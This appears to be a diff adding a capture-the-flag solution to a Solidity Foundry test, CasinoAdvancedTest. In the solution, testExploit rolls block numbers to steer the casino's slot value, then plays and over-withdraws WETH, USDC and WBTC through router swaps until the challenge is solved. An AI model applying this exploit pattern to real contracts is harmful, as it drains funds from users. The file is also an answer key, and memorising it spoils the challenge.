@@ -35,5 +35,40 @@ contract CasinoAdvancedTest is Test {
         } while (casino.slot() == 0);
     }
 
-    function testExploit() public {}
+    function testExploit() public {
+        vm.startPrank(you);
+        uint256 height = block.number;
+        while (casino.slot() != 3) {
+            vm.roll(++height);
+        }
+
+        casino.play(Config.WETH, 1_000e18);
+        casino.withdraw(Config.WETH, 1_000e18);
+
+        IERC20(Config.WETH).approve(address(router), type(uint256).max);
+        address[] memory p1 = new address[](2);
+        p1[0] = Config.WETH;
+        p1[1] = Config.USDC;
+        router.swapExactTokensForTokens(IERC20(Config.WETH).balanceOf(you), 0, p1, you, block.timestamp);
+        IERC20(Config.USDC).approve(address(casino), type(uint256).max);
+        skip(1);
+        casino.play(Config.USDC, 1_000_000e6 / 2);
+        skip(1);
+        casino.withdraw(Config.USDC, 1_000_000e6 / 2 + 1_000_000e6);
+
+        IERC20(Config.USDC).approve(address(router), type(uint256).max);
+        address[] memory p2 = new address[](2);
+        p2[0] = Config.USDC;
+        p2[1] = Config.WBTC;
+        router.swapExactTokensForTokens(IERC20(Config.USDC).balanceOf(you), 0, p2, you, block.timestamp);
+        IERC20(Config.WBTC).approve(address(casino), type(uint256).max);
+        skip(1);
+        casino.play(Config.WBTC, 1e8 / 2);
+        skip(1);
+        casino.withdraw(Config.WBTC, 1e8 / 2 + 1e8);
+
+        base.solve();
+        assertTrue(base.isSolved());
+        vm.stopPrank();
+    }
 }
